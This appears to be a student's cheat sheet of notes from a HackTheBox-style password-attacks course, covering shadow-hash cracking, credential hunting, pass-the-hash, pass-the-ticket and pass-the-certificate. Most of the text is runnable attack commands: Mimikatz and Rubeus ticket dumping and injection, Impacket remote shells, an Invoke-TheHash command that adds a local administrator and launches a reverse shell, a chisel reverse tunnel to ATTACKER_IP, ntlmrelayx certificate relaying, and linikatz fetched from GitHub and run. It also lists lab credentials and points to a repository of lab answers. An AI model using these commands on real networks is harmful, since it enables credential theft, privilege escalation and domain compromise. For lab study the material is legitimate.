- Files with names like `pass.txt`, `passwords.docx`, `passwords.xlsx` found on user systems, shares, and [Sharepoint](https://www.microsoft.com/en-us/microsoft-365/sharepoint/collaboration)



# Section 16 - Linux Authentication Process


Linux commonly uses **PAM (Pluggable Authentication Modules)** for login, password changes, sessions, LDAP, and Kerberos authentication. The `pam_unix.so` module mainly works with `/etc/passwd` and `/etc/shadow`. The `/etc/passwd` file is readable by everyone and stores usernames, UID, GID, home directory, and shell information. Its password field normally contains `x`, meaning the actual password hash is stored in `/etc/shadow`. The `/etc/shadow` file is restricted to administrators and stores password hashes, ageing, and expiration information. Hashes follow the format `$id$salt$hash`; common IDs include `$1$` for MD5, `$5$` for SHA-256, `$6$` for SHA-512, and `$y$` for yescrypt. A password field containing `!` or `*` disables password login, while an empty field may allow passwordless access. Old password hashes may be stored in `/etc/security/opasswd`. With authorized root access, the `passwd` and `shadow` files can be combined using `unshadow` and audited with John the Ripper or Hashcat.

| Command                                                                                                                               | Simple purpose                       |
| ------------------------------------------------------------------------------------------------------------------------------------- | ------------------------------------ |
| `cat /etc/passwd`                                                                                                                     | View user account information        |
| `head -n 1 /etc/passwd`                                                                                                               | Show the first account entry         |
| `sudo cat /etc/shadow`                                                                                                                | View protected password hashes       |
| `sudo cat /etc/security/opasswd`                                                                                                      | View old password hashes             |
| `sudo cp /etc/passwd /tmp/passwd.bak`                                                                                                 | Copy the passwd file                 |
| `sudo cp /etc/shadow /tmp/shadow.bak`                                                                                                 | Copy the shadow file                 |
| `unshadow /tmp/passwd.bak /tmp/shadow.bak > /tmp/unshadowed.hashes`                                                                   | Combine passwd and shadow files      |
| `john --single unshadowed.hashes`                                                                                                     |                                      |
| `john unshadowed.hashes`                                                                                                              |                                      |
| `hashcat -m 1800 -a 0 /tmp/unshadowed.hashes /usr/share/seclists/Passwords/Leaked-Databases/rockyou**.txt -o /tmp/unshadowed.cracked` | Audit SHA-512 hashes with a wordlist |


# Section 17 - Credential Hunting in Linux

| **Command**                                                                                                                                                                                                                                                                                                                                                                                                               | **Description**                                                                                                           |
| ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------- |
| `for l in $(echo ".conf .config .cnf");do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null \| grep -v "lib\|fonts\|share\|core" ;done`                                                                                                                                                                                                                                                                       | Script that can be used to find .conf, .config and .cnf files on a Linux system.                                          |
| `for i in $(find / -name *.cnf 2>/dev/null \| grep -v "doc\|lib");do echo -e "\nFile: " $i; grep "user\|password\|pass" $i 2>/dev/null \| grep -v "\#";done`                                                                                                                                                                                                                                                              | Script that can be used to find credentials in specified file types.                                                      |
| `for l in $(echo ".sql .db .*db .db*");do echo -e "\nDB File extension: " $l; find / -name *$l 2>/dev/null \| grep -v "doc\|lib\|headers\|share\|man";done`                                                                                                                                                                                                                                                               | Script that can be used to find common database files.                                                                    |
| `find /home/* -type f -name "*.txt" -o ! -name "*.*"`                                                                                                                                                                                                                                                                                                                                                                     | Uses Linux-based find command to search for text files.                                                                   |
| `for l in $(echo ".py .pyc .pl .go .jar .c .sh");do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null \| grep -v "doc\|lib\|headers\|share";done`                                                                                                                                                                                                                                                             | Script that can be used to search for common file types used with scripts.                                                |
| `for ext in $(echo ".xls .xls* .xltx .csv .od* .doc .doc* .pdf .pot .pot* .pp*");do echo -e "\nFile extension: " $ext; find / -name *$ext 2>/dev/null \| grep -v "lib\|fonts\|share\|core" ;done`                                                                                                                                                                                                                         | Script used to look for common types of documents.                                                                        |
| `cat /etc/crontab`                                                                                                                                                                                                                                                                                                                                                                                                        | Uses Linux-based cat command to view the contents of crontab in search for credentials.                                   |
| `ls -la /etc/cron.*/`                                                                                                                                                                                                                                                                                                                                                                                                     | Uses Linux-based ls -la command to list all files that start with `cron` contained in the etc directory.                  |
| `for i in $(ls /var/log/* 2>/dev/null);do GREP=$(grep "accepted\|session opened\|session closed\|failure\|failed\|ssh\|password changed\|new user\|delete user\|sudo\|COMMAND\=\|logs" $i 2>/dev/null); if [[ $GREP ]];then echo -e "\n#### Log file: " $i; grep "accepted\|session opened\|session closed\|failure\|failed\|ssh\|password changed\|new user\|delete user\|sudo\|COMMAND\=\|logs" $i 2>/dev/null;fi;done` | Some strings we can use to find interesting content in the logs                                                           |
| `tail -n5 /home/*/.bash*` or `cat bash.sh`                                                                                                                                                                                                                                                                                                                                                                                | Uses Linux-based tail command to search the through bash history files and output the last 5 lines.                       |
| `grep -rnw "PRIVATE KEY" /* 2>/dev/null \| grep ":1"`                                                                                                                                                                                                                                                                                                                                                                     | Uses Linux-based command grep to search the file system for key terms `PRIVATE KEY` to discover SSH keys.                 |
| `grep -rnw "PRIVATE KEY" /home/* 2>/dev/null \| grep ":1"`                                                                                                                                                                                                                                                                                                                                                                | Uses Linux-based grep command to search for the keywords `PRIVATE KEY` within files contained in a user's home directory. |
| `grep -rnE '^\-{5}BEGIN [A-Z0-9]+ PRIVATE KEY\-{5}$' /* 2>/dev/null`                                                                                                                                                                                                                                                                                                                                                      |                                                                                                                           |
| `grep -rnw "ssh-rsa" /home/* 2>/dev/null \| grep ":1"`                                                                                                                                                                                                                                                                                                                                                                    | Uses Linux-based grep command to search for keywords `ssh-rsa` within files contained in a user's home directory.         |
| `python3 mimipenguin.py`                                                                                                                                                                                                                                                                                                                                                                                                  | Runs Mimipenguin.py using python3.                                                                                        |
| `bash mimipenguin.sh`                                                                                                                                                                                                                                                                                                                                                                                                     | Runs Mimipenguin.sh using bash.                                                                                           |
| `python2.7 lazagne.py all`                                                                                                                                                                                                                                                                                                                                                                                                | Runs Lazagne.py with all modules using python2.7                                                                          |
| `ls -l .mozilla/firefox/ \| grep default`                                                                                                                                                                                                                                                                                                                                                                                 | Uses Linux-based command to search for credentials stored by Firefox then searches for the keyword `default` using grep.  |
| `cat .mozilla/firefox/1bplpd86.default-release/logins.json \| jq .`                                                                                                                                                                                                                                                                                                                                                       | Uses Linux-based command cat to search for credentials stored by Firefox in JSON.                                         |
| `python3.9 firefox_decrypt.py`                                                                                                                                                                                                                                                                                                                                                                                            | Runs Firefox_decrypt.py to decrypt any encrypted credentials stored by Firefox. Program will run using python3.9.         |
| `python3 lazagne.py browsers`                                                                                                                                                                                                                                                                                                                                                                                             | Runs Lazagne.py browsers module using Python 3.                                                                           |


# Section 18 - Credential Hunting in Network Traffic

To get plain text data from data packets, use tool https://github.com/lgandx/PCredz or search in Wireshark by `find` and `filters`. In Wireshark, it's possible to locate packets that contain specific bytes or strings. One way to do this is by using a display filter such as `http contains "passw"`. Alternatively, you can navigate to `Edit > Find Packet` and enter the desired search query manually. For example, you might search for packets containing the string `"passw"`.

From **Question 1-4**, i searched by `http ---> card` for credit card info, `snmp --> snmpv2` for community string, `ftp --> passw, password, pass` for user pass, `ftp --> transfer` for file names (as if you download a file over ftp, there will be something like `transfer complete`) sequentially. and search the previous and next packets of what you get also.

# Section 19 - Credential Hunting in Network Shares

| Command / Tool                                                                                                                                                    | Run from                   | Simple description                                                          |
| ----------------------------------------------------------------------------------------------------------------------------------------------------------------- | -------------------------- | --------------------------------------------------------------------------- |
| `Get-ChildItem -Path "\\<server>\<share>" -Recurse -Include *.ini,*.cfg,*.env,*.xlsx,*.ps1,*.bat \| Select-String -Pattern "passw","user","token","key","secret"` | Windows host               | Search selected file types in an SMB share for credential-related words     |
| `C:\Users\Public\Snaffler.exe -s`                                                                                                                                 | Windows domain-joined host | Discover readable domain shares and search for sensitive files              |
| `C:\Users\Public\Snaffler.exe -s -u`                                                                                                                              | Windows domain-joined host | Search shared files for Active Directory usernames                          |
| `C:\Users\Public\Snaffler.exe -s -i "<share>" -n "<share>"`                                                                                                       | Windows domain-joined host | Limit Snaffler to selected shares                                           |
| `Invoke-HuntSMBShares -Threads 100 -OutputDirectory "C:\Users\Public"`                                                                                            | Windows host               | Scan SMB shares and create HTML and CSV reports                             |
| `docker run --rm -v "$(pwd)/manspider:/root/.manspider" blacklanternsecurity/manspider <ip> -c "passw" -u "<username>" -p "<password>"`                           | Linux AttackBox            | Search SMB file contents remotely with MANSPIDER                            |
| `nxc smb <ip> -u "<username>" -p "<password>" --spider "<share>" --content --pattern "passw"`                                                                     | Linux AttackBox            | Search a specific SMB share for files containing `passw`                    |
| `nxc smb <Target Ip> -u mendres -p Inlanefreight2025! -M spider_plus -o DOWNLOAD_FLAG=True --smb-timeout 60`                                                      |                            |                                                                             |
| `netexec smb <IP> -u mendres -p 'Inlanefreight2025!' --group "IT_Admins"`                                                                                         |                            | enumerate **who belongs to each group**                                     |
| `bloodhound-python -u mendres -p 'Inlanefreight2025!' -d inlanefreight.local -ns <DC_IP> -c All`                                                                  |                            | Open BloodHound and click the group to see all members and privilege paths. |
A **domain-joined host** is a Windows computer connected to an AD domain, for example `WS01.inlanefreight.local` if the company domain is `inlanefreight.local`.

## Question 1

1. First i tried to list all available shares by `smbclient -L //10.129.234.173 -U 'mendres%Inlanefreight2025!'` and enumerate them manually, it was so tiring and exhausting to find everything manually, as there were 100's of interesting files.
2. `nxc smb <ip> -u "<username>" -p "<password>" --spider "<share>" --content --pattern "passw"`  this also gave me no good result.
3. `enum4linux-ng -u mendres -p Inlanefreight2025! 10.129.234.173 -A` tried this too,  also same.
4.  then `nxc smb <Target Ip> -u mendres -p Inlanefreight2025! -M spider_plus -o DOWNLOAD_FLAG=True --smb-timeout 60`, tried this, downloaded all files, and after going into that output directory, `grep -ri "passw" .`
or  `grep -rEi "user(name)?|login|account|pass(word)?|passwd|pwd|secret|token|api[_-]?key|credential" .`


you will get a lots of things here. This was the most exhausting section.


# Section 20 - Pass the Hash (PtH)


> **Use an NTLM hash instead of the plaintext password for authentication.**

| Tool                   | Full Command                                                                                                                                                                    | Purpose                                                                                                                    |
| ---------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | -------------------------------------------------------------------------------------------------------------------------- |
| **Mimikatz**           | `mimikatz.exe privilege::debug "sekurlsa::pth /user:<USER> /rc4:<NTLM_HASH> /domain:<DOMAIN> /run:cmd.exe" exit`                                                                | PtH → opens CMD as the user                                                                                                |
| **NetExec**            | `netexec smb <IP> -u <USER> -d <DOMAIN> -H <NTLM_HASH>`                                                                                                                         | Test PtH authentication                                                                                                    |
| **NetExec (local)**    | `netexec smb <IP> -u <USER> -d . -H <NTLM_HASH> --local-auth`                                                                                                                   | PtH with local account                                                                                                     |
| **NetExec (network)**  | `netexec smb <SUBNET>/24 -u <USER> -d . -H <NTLM_HASH> --local-auth`                                                                                                            | Find local hash reuse                                                                                                      |
| **NetExec (command)**  | `netexec smb <IP> -u <USER> -d . -H <NTLM_HASH> -x whoami`                                                                                                                      | Execute command                                                                                                            |
| **Impacket PsExec**    | `impacket-psexec <USER>@<IP> -hashes :<NTLM_HASH>`                                                                                                                              | Interactive shell                                                                                                          |
| **Impacket WMIExec**   | `impacket-wmiexec <USER>@<IP> -hashes :<NTLM_HASH>`                                                                                                                             | Command execution via WMI                                                                                                  |
| **Impacket SMBExec**   | `impacket-smbexec <USER>@<IP> -hashes :<NTLM_HASH>`                                                                                                                             | Command execution via SMB                                                                                                  |
| **Impacket ATExec**    | `impacket-atexec <USER>@<IP> -hashes :<NTLM_HASH> "whoami"`                                                                                                                     | Execute via Task Scheduler                                                                                                 |
| **Invoke-TheHash SMB** | `Invoke-SMBExec -Target <IP> -Domain <DOMAIN> -Username <USER> -Hash <NTLM_HASH> -Command "net user mark Password123 /add && net localgroup administrators mark /add" -Verbose` | PtH + SMB command execution                                                                                                |
| **Invoke-TheHash WMI** | `Invoke-WMIExec -Target <IP> -Domain <DOMAIN> -Username <USER> -Hash <NTLM_HASH> -Command "powershell -e revershell_code"`                                                      | PtH + WMI command execution, you can generate revershell on [Online - Reverse Shell Generator](https://www.revshells.com/) |
| **Evil-WinRM**         | `evil-winrm -i <IP> -u <USER> -H <NTLM_HASH>`                                                                                                                                   | WinRM shell using hash                                                                                                     |
| **RDP**                | `xfreerdp /v:<IP> /u:<USER> /pth:<NTLM_HASH>`                                                                                                                                   | RDP using hash                                                                                                             |

### Invoke-TheHash Setup

```powershell
cd C:\tools\Invoke-TheHash
Import-Module .\Invoke-TheHash.psd1
```

### Important Things to Remember

- `SAM` → local account hashes.
    
- `NTDS.dit` → domain account hashes.
    
- `LSASS` → credentials/hashes from memory.
    
- Remote SMB/WMI execution generally requires **administrator privileges** on the target.

### UAC / PtH Rules

- `LocalAccountTokenFilterPolicy = 0` → normal local admin accounts are **blocked from remote admin actions**.
- `LocalAccountTokenFilterPolicy = 1` → local admin accounts **can perform remote admin actions**.
- **RID 500 Administrator** → normally **not affected** by the `= 0` restriction.
- `FilterAdministratorToken = 1` → even RID 500 Administrator gets **UAC restrictions**.
- These rules mainly apply to **local accounts**.
- **Domain admins** are not affected by this local-account restriction.
- RDP PtH requires **Restricted Admin Mode** to be on.

Enable it on the target by remotely connecting throughly shell:

```
reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0 /f
```

Then connect using the hash:

```
xfreerdp /v:<IP> /u:<USER> /pth:<NTLM_HASH>
```

**Remember:** `DisableRestrictedAdmin = 0` → Restricted Admin Mode must be on → RDP PtH can work.




# Section 21 - Pass the Ticket (PtT) from Windows

**Pass The Hash:** Use the user's **NTLM hash** to create a session and access NTLM-based resources.  

**Kerberos/Pass The Ticket:** Use the user's **Kerberos ticket** to access Kerberos-based services like SMB or WinRM.

 **Kerberos (Windows' ticket-based authentication system)** is mainly used for **Active Directory (AD)** domain authentication.
 
 Goal: use a **stolen/forged Kerberos ticket** instead of a password/NTLM hash to move laterally.

## 1. Kerberos Quick Refresher

|Ticket|What it is|Used for|
|---|---|---|
|**TGT** (Ticket Granting Ticket)|Proof you authenticated to the domain|Requesting TGS tickets|
|**TGS** (Ticket Granting Service ticket)|Ticket for one specific service|Accessing that one resource (e.g. MSSQL, CIFS)|

Tickets live in **LSASS** on Windows. Admin rights = you can grab everyone's tickets. Normal user = only your own.

Remember:

                    Stolen credential
                           │
             ┌─────────────┴─────────────┐
             │                           │
        NTLM hash                   Kerberos ticket
             │                           │
             ▼                           ▼
     Pass the Hash (PtH)          Pass the Ticket (PtT)
             │                           │
             ▼                           ▼
     New cmd session              Kerberos access
     as target user               to allowed services
             │                           │
             │                    ┌──────┴──────┐
             │                    │             │
             ▼                    ▼             ▼
      Access resources       SMB/share      PowerShell
      allowed by user        \\DC01\...      Remoting
             │
             │
             ▼
      OverPass the Hash
      (Pass the Key)
             │
             ▼
        Kerberos TGT
             │
             ▼
       Pass the Ticket
             │
             ├──► SMB / shared folders
             │
             └──► PowerShell Remoting



---

## 2. The Big Picture — 3 Stages

|Stage|What happens|How|
|---|---|---|
|**Stage 1 — Get a ticket/key**|Grab an existing ticket, OR just a hash/key|Harvest `.kirbi` tickets from LSASS (Mimikatz/Rubeus)|
|**Stage 2 — Forge a ticket** _(only if you only have a hash)_|Turn a hash/key into a fresh TGT|OverPass-the-Hash (Mimikatz `pth` / Rubeus `asktgt`)|
|**Stage 3 — Pass the Ticket**|Load the ticket into your session|Inject it → access SMB, WinRM, etc.|

Think of it as: **(A) Steal a ticket** _or_ **(B) Forge one from a hash** → **(C) Load it into your session**. 

Stage 2 is a detour — skip it entirely if you already have a real ticket from Stage 1.

---

## 3. Stage 1 — Harvest Existing Tickets

#### Kerberos Tickets

`klist` — Shows Kerberos tickets for the current user/session.  
`klist sessions` — Shows all logon sessions on the computer (requires admin).

### Mimikatz (needs admin)

```cmd
mimikatz.exe
privilege::debug
sekurlsa::tickets /export
```

- Dumps tickets as `.kirbi` files in current folder.
- Filenames with `$` = computer account tickets.
- Filenames like `user@service-domain.kirbi` = user tickets.
- Service name = `krbtgt` → that file is a **TGT**.

### Rubeus (admin = all users' tickets, non-admin = only yours)

```cmd
Rubeus.exe dump /nowrap
```

- Prints tickets as Base64 instead of writing files (`/nowrap` = no line wrapping, easy copy-paste).

---

## 4. Stage 2 — Forge a TGT from a Hash (OverPass-the-Hash / Pass-the-Key)

Use this when you only have a **hash/key** (NTLM or AES), not an actual ticket.

**Step A: Get the key** (Mimikatz, admin required)

```cmd
sekurlsa::ekeys
```

Grab the `aes256_hmac` or `rc4_hmac_nt` value for the target user.

**Step B: Convert hash → TGT**

|Tool|Command|Admin needed?|
|---|---|---|
|Mimikatz|`sekurlsa::pth /domain:<domain> /user:<user> /ntlm:<hash>`|✅ Yes|
|Rubeus|`Rubeus.exe asktgt /domain:<domain> /user:<user> /aes256:<key> /nowrap`|❌ No|
|Rubeus (with rc4)|`Rubeus.exe asktgt /domain:<domain> /user:<user> /rc4:<hash> /nowrap`|❌ No|

⚠️ Using `/rc4` (NTLM) instead of AES can trigger an **"encryption downgrade"** detection on modern domains (2008+ functional level).

- Mimikatz `pth` pops a new `cmd.exe` already carrying the forged identity.
- Rubeus `asktgt` just prints/returns the ticket — you still need Stage 3 to load it (unless you add `/ptt`, see below).

---

## 5. Stage 3 — Pass the Ticket (Load It Into a Session)

### Option A: Rubeus, all-in-one (`/ptt` flag)

Combine forging + injecting in one command:

```cmd
Rubeus.exe asktgt /domain:inlanefreight.htb /user:plaintext /rc4:3f74aa8f08f712f09cd5177b5c1ce50f /ptt
```

Output says **"Ticket successfully imported!"** → you're done, just use the resource:

```cmd
dir \\DC01.inlanefreight.htb\c$
```

### Option B: Rubeus, from a `.kirbi` file already on disk

```cmd
Rubeus.exe ptt /ticket:"[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi"
```

### Option C: Rubeus, from a Base64 string

```cmd
Rubeus.exe ptt /ticket:<Base64EncodedTicket>
```

Convert a `.kirbi` file to Base64 first if needed (PowerShell):

```powershell
[Convert]::ToBase64String([IO.File]::ReadAllBytes("ticket.kirbi"))
```

### Option D: Mimikatz, from a `.kirbi` file

```cmd
mimikatz.exe
privilege::debug
kerberos::ptt "C:\path\to\ticket.kirbi"
exit
```

Tip: use `misc::cmd` in Mimikatz to spawn a new prompt with the ticket already loaded (skips exiting/re-entering).


Through this all options, You're not getting a shell on the target computer. You're just accessing a shared folder over SMB like `\\DC01\john`. To actually get a remote PowerShell session on that target computer, so you can interact with its filesystem/commands, follow the below PowerShell remoting and  you will get `C:\john`.

---

## 6. Lateral Movement via PowerShell Remoting (using the imported ticket)

Once a ticket is loaded in your session (Stage 3), just remote in:

```powershell
Enter-PSSession -ComputerName DC01
```

### Clean method with Rubeus: `createnetonly` (creates a separate session, so your current Kerberos tickets are not affected.)

```cmd
:: 1. open a new session
Rubeus.exe createnetonly /program:"C:\Windows\System32\cmd.exe" /show

:: 2. Inside that new window, request + inject the TGT
Rubeus.exe asktgt /user:john /domain:inlanefreight.htb /aes256:<key> /ptt

:: 3. Now remote in
powershell
Enter-PSSession -ComputerName DC01
```

---


Key Gotchas

- Mimikatz almost always needs **local admin**; Rubeus's `asktgt` (OverPass-the-Hash) **does not**.
- `/rc4` = NTLM hash → risk of downgrade detection. Prefer `/aes256` when you have it.
- `sekurlsa::ekeys` can mis-report keys as `des_cbc_md4` on some Win10 builds — if `sekurlsa::tickets /export` breaks, that's likely why; use Rubeus instead.
- `createnetonly` = Logon Type 9, keeps your **existing session's TGT intact** — safer for opsec than overwriting your current logon.




# Section 22 - Pass the Ticket (PtT) from Linux

Same idea as Windows PtT, but on a **domain-joined Linux box**. Linux stores Kerberos creds as **keytab files** (service/script credentials) or **ccache files** (user session tickets) instead of LSASS.

---

## 0. Two Credential Types You'll Find

|Type|What it is|Default location|Needs|
|---|---|---|---|
|**keytab**|Username + encrypted key, for passwordless script auth|anywhere (often named `*.keytab` or `*.kt`)|read access|
|**ccache**|A live ticket for an already-logged-in user (like a `.kirbi` on Windows)|`/tmp/krb5cc_*` (path stored in env var `KRB5CCNAME`)|read access, ticket must not be expired|

---

## 1. Recon — Is This Box Domain-Joined?

```shellsession

realm list                     # shows realm, allowed users/groups, sssd/winbind info

ps -ef | grep -i "winbind\|sssd"   # fallback if `realm` isn't installed
```

---

## 2. Find Credentials on the Box

### Find keytab files

```shellsession

find / -name *keytab* -ls 2>/dev/null

or

find /etc /opt /var /home -type f \( -iname "*.keytab" -o -iname "*keytab*" \) 2>/dev/null
```

- `/etc/krb5.keytab` = the **machine account's** own ticket (root-only, lets you act as `LINUX01$`).
- keep interesting ones' saved like ` cp /opt/specialfiles/carlos.keytab .`
- Also check cronjobs/scripts — they often `kinit` using a keytab that doesn't have the `.keytab` extension:

```shellsession

crontab -l

cat /path/to/script.sh     # look for a `kinit ... -k -t <file>` line
```

### Find ccache files

```shellsession

env | grep -i krb5              # KRB5CCNAME=FILE:/tmp/krb5cc_xxxx  → shows YOUR ticket path

ls -la /tmp                     # look for other users' krb5cc_* files (need root/their perms to read)
```

---

## 3. Use a KeyTab File → Impersonate That User

```shellsession

klist -k -t /path/to/file.keytab      # step 1: see which principal (user) it belongs to

kinit carlos@INLANEFREIGHT.HTB -k -t /opt/specialfiles/carlos.keytab   # step 2: Use the keytab to log in as carlos (case-sensitive!)

klist                                  # step 3: Check that you now have carlos's Kerberos ticket
```

Now use the ticket against a service:

```shellsession
smbclient //dc01/carlos -k -c ls
```

⚠️ Save your own ccache first (`cp $KRB5CCNAME ~/backup_ticket`) before overwriting it with `kinit`.

---

## 4. Escalate Further — Crack the KeyTab's Hash

Sometimes you want the **actual password** (e.g. to `su` locally), not just a ticket.

```shellsession

python3 /opt/keytabextract.py /opt/specialfiles/carlos.keytab
```

Outputs NTLM / AES128 / AES256 hashes for the account.

| Hash type       | What to do with it                                                         |
| --------------- | -------------------------------------------------------------------------- |
| NTLM            | Crack with Hashcat/John, or use online (e.g. crackstation.net)             |
| AES256 / AES128 | Forge a fresh TGT with Rubeus (OverPass-the-Hash) — see Windows cheatsheet |

Once cracked:

```shellsession

su - carlos@inlanefreight.htb    # log in locally with the recovered password
```

Repeat this process on any other keytabs you find (e.g. a cronjob's `svc_workstations.kt`) to chain further.

If you cant find NTLM hash for that user, Look at the dir for siblings (`ls -la`). 

---

## 5. Use a ccache File → Impersonate That User (needs root/read access)

```shellsession

klist                                          # check current ticket (should be empty/none as root)

cp /tmp/krb5cc_647401106_xxxx .                # Copy the user's ticket to root or any dir

export KRB5CCNAME=/root/krb5cc_647401106_xxxx  # Tell Kerberos to use that ticket ( = is_path_ticket)

klist                                          # confirm identity switched
```

Then just use it from that dir:

```shellsession

smbclient //dc01/C$ -k -c ls -no-pass
```

⚠️ ccache tickets **expire** — check "Expires" in `klist` output before relying on one.

**Good target to look for:** run `id <user>` on any ccache owner to check for high-value group membership (e.g. `Domain Admins`).

```shellsession

id julio@inlanefreight.htb
```

---

## (Another Method) 

### Using These Tickets From Your Attack Host (not domain-joined)

If your attack box can't reach the KDC directly, proxy through a domain-joined pivot (e.g. MS01):

```shellsession

# 1. ON YOUR ATTACK HOST: start chisel server, wait for MS01 to dial back in:

./chisel server --reverse

# 2. ON MS01 (the pivot): connect out to your attack host, opening a SOCKS tunnel
#    <ATTACKER_IP> = your attack host's IP (not MS01's, not the DC's)

chisel.exe client <ATTACKER_IP>:8080 R:socks

# 3. ON YOUR ATTACK HOST: hardcode DNS so Kerberos can resolve the DC's hostname
#    172.16.1.10 = the DC's real internal IP, reachable only through the tunnel

echo "172.16.1.10 dc01.inlanefreight.htb dc01" >> /etc/hosts

# 4. ON YOUR ATTACK HOST: point proxychains at the SOCKS proxy chisel just opened
#    127.0.0.1:1080 = your OWN attack host's loopback, not MS01's
#    (edit /etc/proxychains.conf)

# [ProxyList]
# socks5 127.0.0.1 1080

# 5. ON YOUR ATTACK HOST: load the stolen ticket (e.g. Julio's, copied over from LINUX01)

export KRB5CCNAME=/home/user/krb5cc_647401106_xxxx
```

Everything above runs **on your attack host**, except step 2, which runs on MS01 and only exists to create the tunnel back into the target network.

### Then use Kerberos-aware tools through proxychains:

```shellsession

proxychains impacket-wmiexec dc01 -k              # -k = use Kerberos ticket (not password)

proxychains evil-winrm -i dc01 -r inlanefreight.htb
```

- Use the **hostname**, not IP (Kerberos needs the SPN to match).
- Evil-WinRM needs `krb5-user` package installed + `/etc/krb5.conf` pointing to the right realm/KDC first (`cat /etc/krb5.conf`, change realm).

---

## Converting Between Ticket Formats

|From|To|Command|
|---|---|---|
|ccache (Linux)|kirbi (Windows)|`impacket-ticketConverter krb5cc_xxxx julio.kirbi`|
|kirbi (Windows)|inject into Windows session|`Rubeus.exe ptt /ticket:julio.kirbi`|

Useful when you steal a ticket on Linux but want to pass it into a Windows session (or vice versa), then just run in windows `Rubeus.exe ptt /ticket:c:\tools\julio.kirbi`.

---

## Automated Loot: Linikatz (root required)

Think "Mimikatz for Linux" — dumps all Kerberos creds from every implementation (SSSD, Samba, FreeIPA, etc.) in one shot, download or move in target or target shell and run.

```shellsession

wget https://raw.githubusercontent.com/CiscoCXSecurity/linikatz/master/linikatz.sh

sudo ./linikatz.sh
```

Results get dumped into a `linikatz.*` folder as ccache/keytab files — use them exactly as described in sections 3 & 5.

---

## Questions

Check [HackTheBox-Password-Attacks-Labs/Pass-The-Ticket-from-Linux.md at main · sudo-st8less/HackTheBox-Password-Attacks-Labs](https://github.com/sudo-st8less/HackTheBox-Password-Attacks-Labs/blob/main/Pass-The-Ticket-from-Linux.md) for answers.



# Section 23 - Pass the Certificate

Same goal as normal Pass the Ticket: get a TGT, then use it. The difference: here you get the TGT using a **certificate** instead of a hash or a stolen ticket.

### The 3 Stages

|Stage|Goal|How|
|---|---|---|
|**1. Get a certificate**|Get a `.pfx` file for the target account|Two ways: **ESC8** or **Shadow Credentials**|
|**2. Turn cert into TGT**|Swap the cert for a real TGT|`gettgtpkinit.py`|
|**3. Use the TGT**|Same as normal Pass the Ticket|`export KRB5CCNAME=...` then run a tool|
## Before You Start — What Even Is a `.pfx`?

A `.pfx` file bundles two things into one package:

- A **certificate** — like a digital ID card.
- Its matching **private key** — the secret proof that the ID is really yours.

Normally these are two separate files. `.pfx` just zips them together (sometimes with a password protecting it).

**Why we need one:** Kerberos has a mode called **PKINIT** that lets you log in with a certificate instead of a password — like a smart card. But just showing a certificate isn't enough, since certificates are basically public info. You also have to prove you hold the _private key_ that matches it. So to fake being someone via PKINIT, you need a valid cert **+** key pair — that's exactly what a `.pfx` gives you.

### ESC8 in plain terms — steal a smart card via a rigged phone line

Some Certificate Authorities run a website where any computer can request a certificate (`/certsrv`), over plain unprotected HTTP.

1. You trick a machine (like the DC) into "calling" you — logging into your computer instead of its real target (using something like the printer bug).
2. You catch that login attempt and immediately forward it to the CA's website, pretending **you** are that machine.
3. The CA believes it and hands you a certificate for that machine.

You never needed the machine's password — you just intercepted its login attempt and redirected it somewhere it didn't mean to go. That's a **relay attack**: catch a real login, forward it to a different door.

### Shadow Credentials in plain terms — add your own spare key to someone's lock

Every AD account has a hidden field (`msDS-KeyCredentialLink`) meant to store keys for passwordless smart-card login. If you're allowed to _edit_ that field on someone else's account (a permission that's sometimes misconfigured), you can quietly add **your own key** to it.

AD now thinks that key belongs to them. So when you show up with a certificate matching that key, AD lets you log in **as them** — because as far as AD's records show, that's a legitimate smart card on their account.

No tricking, no relay — just misusing a permission you already had to plant a backdoor key.

---

## 1A. Way 1 — ESC8 (steal a cert via relay attack)

Use this when the CA lets people request certs over a website (`/certsrv`).

```shellsession

# 1. Start listening for auth requests (start relay) and forward them to the CA website:

impacket-ntlmrelayx -t http://<CA_IP>/certsrv/certfnsh.asp --adcs -smb2support --template KerberosAuthentication

# 2. In other tab, Trick a machine (e.g. the DC) into connecting to you:

python3 printerbug.py <DOMAIN>/<user>:'<password>'@<TARGET_IP> <YOUR_IP>
```

What happens:

1. `printerbug.py` tricks the target machine into logging into your computer.
2. `ntlmrelayx` catches that login and forwards it to the CA website.
3. The CA thinks it's a real request and hands you a certificate file (e.g. `DC01$.pfx`).

You now hold a certificate that proves you're `DC01$`.

---

## 1B. Way 2 — Shadow Credentials (plant your own key)

Use this when you already have write access to a user's `msDS-KeyCredentialLink` field. 
If you're checking a **user's AD account** for the `msDS-KeyCredentialLink` attribute, you can query it with PowerShell, You **don't need to be logged in as that user**. You just need an account that has permission to **read the user's AD object** (which is normally allowed for domain users).:

```

Get-ADUser username -Properties msDS-KeyCredentialLink | Select-Object Name,msDS-KeyCredentialLink
```

Or with LDAP tools:

```
ldapsearch -x -H ldap://DC01 -D 'user@domain.local' -W -b 'DC=domain,DC=local' '(sAMAccountName=username)' msDS-KeyCredentialLink
```

(BloodHound calls this edge `AddKeyCredentialLink`.) No tricking anyone needed — you just add your own key to their account.

```shellsession

pywhisker --dc-ip <DC_IP> -d <DOMAIN> -u <your_user> -p '<your_password>' --target <victim_user> --action add
```

This gives you a `.pfx` file **and a password** for it. Save both — the password is shown only once.

---

## 2. Turn the Certificate into a TGT

Same command either way — just use whichever `.pfx` you got.

```shellsession

# One-time setup
git clone https://github.com/dirkjanm/PKINITtools.git && cd PKINITtools

python3 -m venv .venv && source .venv/bin/activate

pip3 install -r requirements.txt

# If you got the cert from ESC8 (no password needed):

python3 gettgtpkinit.py -cert-pfx DC01\$.pfx -dc-ip <DC_IP> '<DOMAIN>/dc01$' /tmp/dc.ccache

# If you got the cert from Shadow Credentials (has a password):

python3 gettgtpkinit.py -cert-pfx victim.pfx -pfx-pass '<PFX_PASSWORD>' -dc-ip <DC_IP> <DOMAIN>/<victim_user> /tmp/victim.ccache
```

This gives you a `.ccache` file — a real TGT.

> Getting a `libcrypto` error? Run: `pip3 install -I git+https://github.com/wbond/oscrypto.git`

---

## 3. Use the TGT (normal Pass the Ticket)

```shellsession

